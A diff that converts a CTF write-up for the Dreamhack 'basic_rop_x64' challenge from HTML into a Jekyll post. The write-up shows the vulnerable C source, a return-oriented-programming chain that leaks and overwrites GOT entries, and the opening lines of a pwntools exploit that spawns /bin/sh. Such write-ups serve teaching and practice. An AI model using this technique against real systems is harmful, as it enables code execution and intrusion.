@@ -1,24 +1,13 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>milkbomb11</title>
-    <link rel="stylesheet" href="/style.css">
-</head>
-<body>
+---
+title: basic_rop_x64
+---
+<p>
+    The problem can be seen <a href="https://dreamhack.io/wargame/challenges/29">here</a>. <br/> 
+    The source code of the target program is as below.
+</p>
 
-    <header>
-        <h1>milkbomb11</h1>
-        <a href="/index.html">[to index]</a>
-    </header>
-
-    <main>
-        <p>The problem can be seen <a href="https://dreamhack.io/wargame/challenges/29">here</a>.<br/>
-            The source code of the target program is as below.
-        </p>
-
-        <pre><code>
+{% raw %}
+<pre><code>
 #include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;signal.h&gt;
@@ -49,18 +38,22 @@ int main(int argc, char *argv[]) {
 
     return 0;
 }
-        </code></pre>
+</code></pre>
+{% endraw %}
 
-        <p>As we can see, a buffer overflow can occur in main so we can craft an rop chain as follows. </p>
+<p>As we can see, a buffer overflow can occur in main so we can craft an rop chain as follows. </p>
 
-        <pre><code>
+{% raw %}
+<pre><code>
 rdi_gadget+p64(0x1)+rsi_gadget+p64(write_got_addr)+p64(0x2)+p64(write_plt) +
 rdi_gadget+p64(0x0)+rsi_gadget+p64(write_got_addr)+p64(0x2)+p64(read_plt) +
 rdi_gadget+p64(0x0)+rsi_gadget+p64(read_got_addr)+p64(0x2)+p64(read_plt) +
 rdi_gadget+p64(read_got_addr)+rsi_gadget+p64(read_got_addr+8)+p64(0x2) + p64(write_plt)
-        </code></pre>
+</code></pre>
+{% endraw %}
 
-        <p>
+{% raw %}
+<p>
 The first line executes <code>write(1, got_addr_of_write, 0x40)</code>, leaking the got entry of <code>write</code> which we use to calculate the 
 got entry of <code>execv</code>
 The second line executes <code>read(0, got_addr_of_write, 0x40)</code>, allowing us to overwrite the got entry of write with the got entry of <code>execv</code>. 
@@ -70,12 +63,12 @@ Finally, in the last line, since we've used the previous two reads to overwrite 
 used the got entry of <code>read</code> as a sort of global buffer in which to store the arguments needed for <code>execv</code>, the address to "/bin/sh" will be stored in %rdi, 
 the address to an array that contains the address to "/bin/sh" and NULL will be stored in %rsi, and setting %rip to write@plt will execute <code>execv("/bin/sh", 
 {"/bin/sh", NULL})</code> instead of <code>write("/bin/sh", {"/bin/sh", NULL}, 0x40)</code> since we tampered the got entry of write in line 2.
-        </p>
-        <p>
-            The exploit code is as below.
-        </p>
+</p>
+{% endraw %}
+<p> The exploit code is as below. </p>
 
-        <pre><code>
+{% raw %}
+<pre><code>
 #!/usr/bin/python3
 from pwn import *
 
@@ -123,8 +116,5 @@ def exploit():
 
 
 if __name__ == "__main__": exploit()
-        </code></pre>
-
-    </main>
-</body>
-</html>
+</code></pre>
+{% endraw %}
